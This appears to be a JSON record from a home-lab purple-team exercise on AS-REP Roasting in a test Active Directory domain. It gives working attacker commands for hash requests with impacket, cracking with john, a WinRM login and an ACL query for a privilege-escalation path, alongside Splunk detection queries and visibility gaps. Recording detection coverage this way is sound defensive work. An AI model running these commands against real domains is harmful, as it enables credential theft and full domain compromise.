@@ -1,0 +1,113 @@
+{
+  "attack_id": "ATK-004",
+  "name": "AS-REP Roasting",
+  "sprint": 1,
+  "date": "2026-04-25",
+  "status": "complete",
+  "mitre": {
+    "tactic": "Credential Access",
+    "technique": "Steal or Forge Kerberos Tickets",
+    "sub_technique": "AS-REP Roasting",
+    "technique_id": "T1558.004"
+  },
+  "target": {
+    "account": "jdoe",
+    "domain": "corp.local",
+    "dc_ip": "10.10.10.40",
+    "misconfiguration": "DoesNotRequirePreAuth = True"
+  },
+  "attacker": {
+    "host": "kali",
+    "ip": "10.10.10.99",
+    "foothold_creds": "jsmith:Password123!"
+  },
+  "stages": [
+    {
+      "stage": 1,
+      "name": "Account enumeration and AS-REP hash request",
+      "tool": "impacket-GetNPUsers",
+      "command": "impacket-GetNPUsers corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request -outputfile /tmp/jdoe.hash",
+      "result": "AS-REP hash captured for jdoe",
+      "detected": true,
+      "event_id": "4768",
+      "pre_auth_type": "0",
+      "client_address": "::ffff:10.10.10.99",
+      "timestamp": "2026-04-25T19:30:24"
+    },
+    {
+      "stage": 2,
+      "name": "Offline hash cracking",
+      "tool": "john",
+      "command": "john --format=krb5asrep --wordlist=/tmp/corp_wordlist.txt /tmp/jdoe.hash",
+      "result": "Password123! recovered in under 1 second",
+      "detected": false,
+      "gap": "VIS-003"
+    },
+    {
+      "stage": 3,
+      "name": "Authentication attempt via WinRM",
+      "tool": "evil-winrm",
+      "command": "evil-winrm -i 10.10.10.40 -u jdoe -p 'Password123!'",
+      "result": "WinRMAuthorizationError — jdoe not in Remote Management Users",
+      "detected": false
+    },
+    {
+      "stage": 4,
+      "name": "ACL abuse path confirmed",
+      "tool": "Get-ACL (PowerShell on DC01)",
+      "command": "(Get-ACL \"AD:$(Get-ADUser jsmith)\").Access | Where-Object {$_.IdentityReference -like \"*jdoe*\"}",
+      "result": "GenericAll confirmed: CORP\\jdoe has GenericAll over jsmith — full privilege escalation path to DCSync",
+      "detected": false,
+      "gap": "VIS-006"
+    }
+  ],
+  "credentials_recovered": {
+    "account": "jdoe",
+    "password": "Password123!",
+    "hash_type": "krb5asrep",
+    "hashcat_mode": 18200,
+    "hash_snippet": "$krb5asrep$23$jdoe@CORP.LOCAL:47be3bbf2dc923b27..."
+  },
+  "splunk_queries": {
+    "t1_triage": "index=windows EventCode=4768 | search _raw=\"*Pre-Authentication*0x0*\" OR Pre_Authentication_Type=0 | table _time, Account_Name, Client_Address, Pre_Authentication_Type | sort -_time",
+    "t2_timeline": "index=windows | search Client_Address=\"::ffff:10.10.10.99\" | table _time, EventCode, Account_Name, Service_Name, Pre_Authentication_Type | sort _time",
+    "t2_auth": "index=windows EventCode=4624 | search Account_Name=\"jdoe\" | table _time, Account_Name, src_ip, Logon_Type | sort -_time"
+  },
+  "detection_summary": {
+    "total_stages": 4,
+    "detected_stages": 2,
+    "detection_rate": "50%",
+    "key_event": "EC4768 Pre_Authentication_Type=0 from ::ffff:10.10.10.99"
+  },
+  "visibility_gaps": [
+    {
+      "id": "VIS-003",
+      "description": "Offline cracking undetectable",
+      "status": "accepted"
+    },
+    {
+      "id": "VIS-005",
+      "description": "Account enumeration via LDAP/GetNPUsers leaves no Security log entry",
+      "fix": "Honeypot accounts + LDAP audit logging — Sprint 4"
+    },
+    {
+      "id": "VIS-006",
+      "description": "ACL enumeration generates no Security event — GenericAll path invisible",
+      "fix": "Enable advanced AD auditing Object Access — Sprint 4",
+      "new": true
+    }
+  ],
+  "lessons_learned": [
+    "Pre-auth disabled = offline-crackable hash with no credentials required for target",
+    "EC4768 Pre-Auth=0 is high-fidelity — almost never a false positive",
+    "WinRM access not required — impact evaluated via ACL rights and privilege paths",
+    "GenericAll jdoe->jsmith->DCSync = full domain compromise from one unprivileged account",
+    "Save hashes to ~/corplab/hashes/ not /tmp — survives reboots"
+  ],
+  "next_attack": "ATK-005 BloodHound AD Enumeration",
+  "sprint1_cumulative": {
+    "total_stages": 18,
+    "total_detected": 10,
+    "cumulative_rate": "56%"
+  }
+}
